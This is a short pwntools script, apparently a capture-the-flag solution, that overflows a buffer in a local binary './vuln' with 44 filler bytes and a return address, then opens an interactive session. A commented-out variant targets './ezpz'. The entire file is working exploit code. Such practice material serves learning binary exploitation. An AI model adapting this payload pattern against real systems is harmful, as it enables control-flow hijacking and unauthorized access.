from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)



exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'



# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

payload = flat(
    b'A' * 44,
    0x080491f6
)
# Save the payload to file
write('payload2', payload)

# Send the payload
io.sendlineafter(b": ",payload)
io.interactive()
# Receive the flag
# io.interactive()
# p = process('./ezpz')
# payload = b"A"*32 
# payload += p64(0x0000000000041172)

# print(payload)
# p.sendlineafter(": ", payload)

# p.readline() 

